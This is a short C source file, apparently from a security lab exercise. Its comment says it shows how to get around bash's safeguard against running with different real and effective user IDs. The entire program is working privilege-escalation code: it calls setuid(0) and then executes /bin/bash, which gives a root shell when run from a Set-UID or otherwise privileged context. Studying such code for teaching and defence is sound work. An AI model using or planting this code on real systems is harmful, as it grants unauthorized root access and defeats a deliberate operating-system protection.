#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

/* This program shows how to get around the bash shell's countermeasure
   regarding it being run with different user id and effective id.  */
int main (int argc, char **argv)
{
    char *v[2];
    v[0] = "/bin/bash";
    v[1] = '\0';

    setuid(0);

    execve(v[0], v, '\0');

    return 0;
}
